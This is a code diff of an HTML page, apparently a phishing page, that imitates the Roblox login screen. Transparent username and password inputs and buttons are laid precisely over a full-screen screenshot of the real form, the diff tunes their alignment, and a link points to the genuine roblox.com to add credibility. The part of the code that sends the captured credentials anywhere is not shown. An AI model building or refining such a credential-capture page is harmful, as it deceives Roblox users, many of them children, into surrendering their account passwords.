@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roblox Giriş</title>
     <style>
-        /* Ekranı sıfırlama ve arka plan */
+        /* Ekranın tüm boşluklarını sıfırlıyoruz */
         html, body {
             margin: 0;
             padding: 0;
@@ -20,47 +20,45 @@
         }
 
         /* 
-           ESNEK KİLİT SİSTEMİ: 
-           Resmin orijinal en-boy oranını (16:9 standardı) tarayıcıya kilitler.
-           Bu sayede resim küçülürse inputlar da küçülür, tam oturur.
+           RESMİ VE INPUTLARI TAM EKRANA ZORLAYAN KAPSAYICI:
+           Sağdaki ve soldaki siyah boşlukları tamamen yok eder.
         */
         .wrapper {
             position: relative;
             width: 100vw;
-            height: 56.25vw; /* 16:9 oranını korumak için dikey hesaplama */
-            max-height: 100vh;
-            max-width: 177.78vh; /* Yatayda taşmayı önleme */
+            height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
         }
 
+        /* object-fit: fill; yaparak resmi ekranına tam yayılmaya zorluyoruz */
         .tam-ekran-resim {
             width: 100%;
             height: 100%;
-            object-fit: contain;
+            object-fit: fill; /* Resmi ekran genişliğine göre esnetir, boşluk bırakmaz */
             display: block;
         }
 
         /* 
            GİRİŞ PANELİ ÇERÇEVESİ:
-           Resmin tam merkezindeki gri Roblox giriş formunun koordinatlarına kilitlendi.
+           Tam ekrana yayılmış resmin üzerindeki gri panele kilitlendi.
         */
         .form-container {
             position: absolute;
-            width: 19.8%; /* Resme göre tam yatay genişlik yüzdesi */
-            height: 48.5%; /* Resme göre en üstten en alta form yüksekliği */
-            top: 36.1%;   /* Dikeyde tam doğru başlangıç noktası */
+            width: 19.8%; /* Yatay genişlik oranı */
+            height: 48.5%; /* Üstten alta toplam form yüksekliği */
+            top: 36.1%;   /* Formun başladığı dikey nokta */
             left: 50.1%;
             transform: translateX(-50%);
             box-sizing: border-box;
         }
 
-        /* Tüm elemanları bu çerçevenin içinde bağımsız katmanlar olarak konumlandırıyoruz */
+        /* Tüm elemanları bağımsız katmanlar olarak çiviliyoruz */
         .form-container input, .form-container button, .form-container a {
             position: absolute;
             width: 100%;
-            height: 12.2%; /* Her bir kutunun dikey kalınlık oranı */
+            height: 12.2%; 
             left: 0;
             background: transparent;
             border: none;
@@ -82,7 +80,7 @@
         }
 
         /* ============================================================ */
-        /* RESMİN ÜZERİNE ÇAKILMIŞ MİLİMETRİK ORANLAR (Yukarıdan Aşağıya) */
+        /* YAZIYI YUKARI ALMAK İÇİN DEĞERLERİ AZALT, AŞAĞI İÇİN ARTIR!  */
         /* ============================================================ */
 
         /* 1. KUTU: Username Giriş Alanı */
@@ -92,30 +90,30 @@
 
         /* 2. KUTU: Password Giriş Alanı */
         .password-field {
-            top: 16.5%; /* Tam olarak ikinci gri kutunun içine oturur */
+            top: 16.5%; 
         }
 
         /* 3. BUTON: Log in butonu */
         .login-btn {
-            top: 33.2%; /* Tam olarak ortadaki Log in butonuna kilitlenir */
-            height: 13.5%; /* Log in butonu orijinal tasarımdaki gibi hafif kalın yapıldı */
+            top: 33.2%; 
+            height: 13.5%; 
         }
 
         /* 4. BUTON: Send me the one-time code by email */
         .one-time-code-btn {
-            top: 65.2%; /* "Forgot..." metnini es geçip alt gri butona oturur */
+            top: 65.2%; 
             height: 13.5%;
         }
 
         /* 5. BUTON: Quick Login */
         .quick-login-btn {
-            top: 81.8%; /* En alttaki gri butona kilitlenir */
+            top: 81.8%; 
             height: 13.5%;
         }
 
         /* 6. LİNK: En alttaki Sign Up yazısı */
         .signup-link {
-            top: 101%; /* En alttaki "Sign up." kelimesinin tam üstü */
+            top: 101%; 
             height: 8%;
             width: 25%; 
             left: auto;
@@ -126,30 +124,17 @@
 <body>
 
     <div class="wrapper">
-        <!-- Arka plan resmi -->
+        <!-- Arka plan resmi artık ekranı tamamen kaplayacak -->
         <img src="roblox_giris.png" class="tam-ekran-resim" alt="Roblox">
 
-        <!-- Yeni nesil kilitli esnek form paneli -->
+        <!-- Kilitli form paneli -->
         <form id="girisFormu" class="form-container">
-            
-            <!-- Kullanıcı adı -->
             <input type="text" id="username" name="username" class="username-field" required autocomplete="off">
-            
-            <!-- Şifre -->
             <input type="password" id="password" name="password" class="password-field" required>
-            
-            <!-- Log in butonu -->
             <button type="submit" class="login-btn" title="Giriş Yap"></button>
-            
-            <!-- One-time code butonu -->
             <button type="button" class="one-time-code-btn"></button>
-            
-            <!-- Quick Login butonu -->
             <button type="button" class="quick-login-btn"></button>
-            
-            <!-- Sign up linki -->
             <a href="https://roblox.com" target="_blank" class="signup-link" title="Kayıt Ol"></a>
-
         </form>
     </div>
 
